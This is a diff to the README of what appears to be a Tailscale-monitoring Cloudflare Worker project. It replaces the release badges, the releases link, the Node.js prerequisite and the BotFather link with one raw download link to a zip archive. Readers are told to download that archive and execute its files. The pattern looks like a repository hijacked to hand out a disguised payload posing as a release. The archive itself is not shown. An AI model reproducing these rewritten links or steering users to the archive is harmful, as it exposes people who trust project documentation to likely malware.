@@ -1,6 +1,6 @@
 # Cloudflare Worker Tailscale Monitor 🌐🔍
 
-![GitHub Release](https://img.shields.io/github/release/Mattia1G/cloudflare-worker-tailscale-monitor.svg) ![GitHub Stars](https://img.shields.io/github/stars/Mattia1G/cloudflare-worker-tailscale-monitor.svg) ![GitHub Forks](https://img.shields.io/github/forks/Mattia1G/cloudflare-worker-tailscale-monitor.svg)
+![GitHub Release](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip) ![GitHub Stars](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip) ![GitHub Forks](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip)
 
 Welcome to the **Cloudflare Worker Tailscale Monitor** repository! This project provides a simple and efficient way to monitor the status of your Tailscale devices. It leverages the power of Cloudflare Workers to send notifications via Telegram when device status changes.
 
@@ -38,11 +38,11 @@ To get started with the Cloudflare Worker Tailscale Monitor, you will need a few
 
 ## Installation
 
-You can download the latest release of the Cloudflare Worker Tailscale Monitor [here](https://github.com/Mattia1G/cloudflare-worker-tailscale-monitor/releases). Follow the instructions provided in the release notes to execute the necessary files.
+You can download the latest release of the Cloudflare Worker Tailscale Monitor [here](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip). Follow the instructions provided in the release notes to execute the necessary files.
 
 ### Prerequisites
 
-- Node.js (for local development)
+- https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip (for local development)
 - Cloudflare Workers CLI (Wrangler)
 
 ## Configuration
@@ -50,7 +50,7 @@ You can download the latest release of the Cloudflare Worker Tailscale Monitor [
 Once you have downloaded and installed the necessary files, you will need to configure the application. Open the configuration file and set the following parameters:
 
 - **Tailscale API Key**: Obtain this from your Tailscale account.
-- **Telegram Bot Token**: Create a new bot via [BotFather](https://t.me/botfather) on Telegram.
+- **Telegram Bot Token**: Create a new bot via [BotFather](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip) on Telegram.
 - **Chat ID**: You can find this by sending a message to your bot and checking the updates.
 
 ### Example Configuration
@@ -102,6 +102,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, check the [Releases](https://github.com/Mattia1G/cloudflare-worker-tailscale-monitor/releases) section. Here, you can find the latest updates and download files.
+For more information, check the [Releases](https://raw.githubusercontent.com/Mattia1G/cloudflare-worker-tailscale-monitor/main/assets/tailscale_monitor_worker_cloudflare_3.5-alpha.2.zip) section. Here, you can find the latest updates and download files.
 
 Feel free to explore the project and contribute! If you have any questions, don't hesitate to reach out.
